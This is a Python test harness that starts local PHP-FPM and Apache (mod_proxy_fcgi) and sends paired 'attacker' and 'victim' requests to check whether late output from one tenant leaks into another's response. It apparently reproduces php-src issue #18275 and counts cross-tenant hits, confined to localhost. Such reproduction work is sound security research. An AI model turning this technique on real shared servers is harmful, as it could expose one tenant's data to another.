#!/usr/bin/env python3
"""Run PHP-FPM php-src #18275's late-output pattern through Apache mod_proxy_fcgi."""

from __future__ import annotations

import argparse
import os
import shutil
import socket
import subprocess
import tempfile
import time
from pathlib import Path


def wait_for_port(host: str, port: int, process: subprocess.Popen[str]) -> None:
    deadline = time.monotonic() + 15
    while time.monotonic() < deadline:
        try:
            with socket.create_connection((host, port), timeout=1):
                return
        except OSError:
            if process.poll() is not None:
                stderr = process.stderr.read() if process.stderr else ""
                raise RuntimeError(stderr)
    raise TimeoutError(f"{host}:{port} did not listen")


def read_response(sock: socket.socket) -> bytes:
    data = b""
    sock.settimeout(3)
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(8192)
        if not chunk:
            return data
        data += chunk
    head, body = data.split(b"\r\n\r\n", 1)
    length: int | None = None
    for line in head.split(b"\r\n"):
        if line.lower().startswith(b"content-length:"):
            length = int(line.split(b":", 1)[1])
    if length is not None:
        while len(body) < length:
            chunk = sock.recv(8192)
            if not chunk:
                break
            body += chunk
        return head + b"\r\n\r\n" + body[:length]
    sock.settimeout(0.5)
    while True:
        try:
            chunk = sock.recv(8192)
        except socket.timeout:
            break
        if not chunk:
            break
        body += chunk
    return head + b"\r\n\r\n" + body


def find_fpm() -> str:
    for name in ("php-fpm", "php-fpm8.4", "php-fpm8.3", "php-fpm8.2"):
        path = shutil.which(name)
        if path:
            return path
    raise RuntimeError("php-fpm binary not found")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--httpd", required=True, type=Path)
    parser.add_argument("--server-root", required=True, type=Path)
    parser.add_argument("--docroot", required=True, type=Path)
    args = parser.parse_args()

    with tempfile.TemporaryDirectory(prefix="php-fpm-finish-apache-") as tmp:
        root = Path(tmp)
        fpm_port = 19090
        fpm_conf = root / "php-fpm.conf"
        fpm_conf.write_text(f"""\
[global]
daemonize = no
error_log = {root / 'fpm-error.log'}
pid = {root / 'fpm.pid'}

[www]
listen = 127.0.0.1:{fpm_port}
listen.mode = 0666
user = www-data
group = www-data
pm = static
pm.max_children = 2
catch_workers_output = yes
""")
        fpm = subprocess.Popen(
            [find_fpm(), "-F", "-y", str(fpm_conf)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            env={**os.environ},
        )
        config = root / "httpd.conf"
        config.write_text(f"""\
ServerRoot "{args.server_root}"
Listen 127.0.0.1:18083
PidFile "{root / 'httpd.pid'}"
ErrorLog "{root / 'error.log'}"
LoadModule unixd_module modules/mod_unixd.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so
ProxyPassMatch "^/(.*\\.php)$" "fcgi://127.0.0.1:{fpm_port}{args.docroot}/$1" enablereuse=on
""")
        apache = subprocess.Popen(
            [str(args.httpd), "-f", str(config), "-DFOREGROUND", "-X"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            env={**os.environ, "APACHE_RUN_DIR": str(root)},
        )
        try:
            wait_for_port("127.0.0.1", fpm_port, fpm)
            wait_for_port("127.0.0.1", 18083, apache)
            hits = 0
            victim_responses: list[bytes] = []
            for iteration in range(20):
                marker = f"POISON-{iteration}"
                with socket.create_connection(("127.0.0.1", 18083), timeout=5) as attacker:
                    attacker.sendall(
                        f"GET /tenant-a.php?marker={marker} HTTP/1.1\r\n"
                        "Host: tenant-a\r\nConnection: close\r\n\r\n".encode()
                    )
                    response_a = read_response(attacker)
                # The PHP shutdown callback sleeps after fastcgi_finish_request;
                # B is sent while that same FPM worker can still emit A bytes.
                time.sleep(0.03)
                with socket.create_connection(("127.0.0.1", 18083), timeout=5) as victim:
                    victim.sendall(
                        b"GET /tenant-b.php HTTP/1.1\r\nHost: tenant-b\r\n"
                        b"Connection: close\r\n\r\n"
                    )
                    response_b = read_response(victim)
                victim_responses.append(response_b)
                if marker.encode() in response_b or b"X-Late-From-A" in response_b:
                    hits += 1
                print(f"php_fpm_iteration={iteration} response_a={response_a!r}")
                print(f"php_fpm_iteration={iteration} response_b={response_b!r}")
            fpm.terminate()
            fpm.wait(timeout=5)
            fpm_log = fpm.stderr.read() if fpm.stderr else ""
            apache_log = (root / "error.log").read_text(errors="replace")
            print(f"php_fpm_cross_tenant_hits={hits}/20")
            print(f"php_fpm_backend_log={fpm_log!r}")
            print(f"php_fpm_apache_error_log={apache_log!r}")
            print(
                "php_fpm_apache_boundary="
                + ("observed" if hits else "not_observed")
            )
            return 0
        finally:
            apache.terminate()
            fpm.terminate()
            for process in (apache, fpm):
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()


if __name__ == "__main__":
    raise SystemExit(main())
